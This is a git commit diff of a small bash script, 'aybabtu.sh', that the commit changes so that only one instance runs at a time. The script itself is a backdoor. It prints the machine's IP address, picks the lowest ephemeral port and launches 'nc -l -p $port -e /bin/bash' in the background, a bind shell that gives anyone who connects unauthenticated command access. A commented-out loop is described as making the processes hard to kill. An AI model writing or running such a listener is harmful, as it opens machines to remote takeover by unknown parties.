8996dc3d5987da8da04600f58a1725863c09920d
nineten <jayden87@gmail.com>
2015-04-10 15:09:55 +0800

    deleted redundant cron script and have logic inside aybabtu instead

--- aybabtu.sh
+++ aybabtu.sh
@@ -1,8 +1,15 @@
 #!/bin/bash
-ifconfig en1 | grep 'inet ' | cut -d' ' -f2
-read lowerPort upperPort <<< $(/usr/sbin/sysctl net.inet.ip.portrange.first net.inet.ip.portrange.last | cut -d':' -f2 | cut -d' ' -f2)
-echo $lowerPort
-nc -l -p $lowerPort -e /bin/bash &
+if ps -ef | grep nc | grep "-e /bin/bash" ; then
+	echo "aybabtu already running"
+	exit 0
+else
+	echo "starting aybabtu"
+	ifconfig en1 | grep 'inet ' | cut -d' ' -f2
+	read lowerPort upperPort <<< $(/usr/sbin/sysctl net.inet.ip.portrange.first net.inet.ip.portrange.last | cut -d':' -f2 | cut -d' ' -f2)
+	echo $lowerPort
+	nc -l -p $lowerPort -e /bin/bash &
+	exit 0
+fi
 #this loop is interesting. makes it hard to kill the processes
 #while :; do
 	#for (( port = lowerPort ; port <= upperPort ; port++ )); do
